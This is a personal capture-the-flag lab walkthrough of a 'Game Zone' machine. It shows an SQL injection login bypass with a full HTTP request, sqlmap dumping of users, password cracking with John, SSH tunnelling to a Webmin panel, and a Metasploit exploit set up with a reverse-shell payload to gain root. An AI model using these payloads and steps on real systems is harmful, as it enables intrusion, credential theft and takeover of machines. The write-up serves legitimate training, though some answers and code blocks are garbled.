Description : Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

## Initial data

## Task 1 |  Deploy the vulnerable machine 
About starting the VM and checking if you can see the website.
### Question 1:  What is the name of the large cartoon avatar holding a sniper on the forum?
First question is something i know by heart; as i was a big fan of the franchise when it was still good.

### Answer 
The answer is ofcourse:
	_**Agent 47**_

Things i guess i always do to new machines:

1. Run Nmap Initial Scan (-A)
2. Run Gobuster
3. Run nmap Full Portscan

## Task 2 | Obtain access via SQLi 

I navigate through the site with Burp Suite Proxy enabled so i can check the webpages loaded later.

I investigate the login POST and attempt to insert basic SQL as the Task Describes. I send the request to the repeater and insert 
	`' OR 1=1 -- -` 

to the username (As instructed)
_Use ' or 1=1 -- - as your username and leave the password blank._
/* Use images here */
	```
	POST /index.php HTTP/1.1
	Host: 10.10.70.215
	Content-Length: 54
	Cache-Control: max-age=0
	Upgrade-Insecure-Requests: 1
	Origin: http://10.10.195.247
	Content-Type: application/x-www-form-urlencoded
	User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36
	Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
	Referer: http://10.10.195.247/
	Accept-Encoding: gzip, deflate
	Accept-Language: en-US,en;q=0.9
	Cookie: PHPSESSID=aip85smbfapug48ravs1ros022
	Connection: close

	username=' or 1=1 -- -&password=&x=20&y=6
	```

This gives us the Login success and redirects us:
	```
	HTTP/1.1 302 Found
	Date: Wed, 07 Jul 2021 10:08:26 GMT
	Server: Apache/2.4.18 (Ubuntu)
	Expires: Thu, 19 Nov 1981 08:52:00 GMT
	Cache-Control: no-store, no-cache, must-revalidate
	Pragma: no-cache
	Location: portal.php
	Content-Length: 4502
	Connection: close
	Content-Type: text/html; charset=UTF-8
	```
### Answer 
Note the _Location: portal.php_ header in the response.

The answer is ofcourse:
	_**portal.php**_

## Task 3 | Using SQLMap

When navigating to porta.php, you can tell its a seach field searching through a database.

By searching for % it shows all results

The task calls to use SQLMap and Burpsuite to figure out injection opportunities.
I saved the request into a file to be used with SQLmap later on.
	`sqlmap -r ./portal_search --dbms=mysql --dump`


IT neatly displays the found user details:

This answers our following questions:
### Answer(s):
In the users table, what is the hashed password?
	_**In the users table, what is the hashed password?**_
What was the username associated with the hashed password?
	_**agent47**_
What was the other table name?
	_**post**_

## Task 4 | Cracking a password with JohnTheRipper 
I copy-pasted the hash from SQLMap into a hash.txt file and ran 
	`john --format=raw-sha256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt`
This produces : videogamer124 as a password.


I attempted to ssh to the machine, but it seems it was not responding to my SSH, so i restarted the machine:

	`ssh agent47@10.10.195.247`
	
This caused a timeout. 


After i restarted the Machine it didnt work either so i debugged ssh by adding the -v flag.
	it was stuck on 
	`debug1: expecting SSH2_MSG_KEX_ECDH_REPLY`
	After some googling i found this and applied it to both my tun0 and eth0 interface, after that it worked!

## Question : What is the user flag?

Anyways; When ssh finally worked;

```
agent47@gamezone:~$ ls
user.txt
agent47@gamezone:~$ cat user.txt 
649ac17b1480ac13ef1e4fa579dac95c
```

### Answer:

## Task 5 | Exposing services with reverse SSH tunnels 

Lets see what ports are open on the target machine

```

When creating a tunnel from Remote machine to my machine i executed the following command (Suggested by the Room):

	`ssh -L 10000:localhost:10000 agent47@10.10.195.247`
	
This means http://localhost:10000 is now available, and we see a Webmin CMS Login page.

## Question : What is the name of the exposed CMS?
### Answer
_**Webmin**_

## Question: What is the CMS version?

We can investigate this by looking at the returned HTTP headers from a failed login attempt.
```
HTTP/1.0 200 Document follows
Date: Wed, 7 Jul 2021 15:15:13 GMT
Server: MiniServ/1.580
Connection: close
Set-Cookie: testing=1; path=/
pragma: no-cache
Expires: Thu, 1 Jan 1970 00:00:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Cache-Control: post-check=0, pre-check=0
Content-type: text/html; Charset=iso-8859-1
```

### Answer
Server: MiniServ/1.580
_**1.580**_

The Hint for this question was: can you use some other credentials.

On further inspection i was able to login with the ssh user/pass
`agent47 | videogamer124`
and obtained access to the Webmin panel


##  Task 6  | Privilege Escalation with Metasploit 

It wants us to use Metasploit to find an exploit for Webmin 1.580. lets do it;

We launch up metasploit
	`msfconsole`
	
Then we search for an exploit for webmin
	`use webmin`
A list presents itself, i select the first one
```
msf6 > use webmin

```

i do 
	`show options`
and set 
````
	set RHOST = 127.0.0.1
	set SSL = false
	
Then we have to select a payload to make a reverse shell for us after sucessful exploit:
	set PAYLOAD cmd/unix/reverse
	set LHOST = <LOCAL tun0 IP>
	set LPORT = 4444
````
after that we run the framework and have a reverse shell running on the remote machine.

## Question : What is the root flag?
```
cd /root
ls
root.txt
cat root.txt    
```
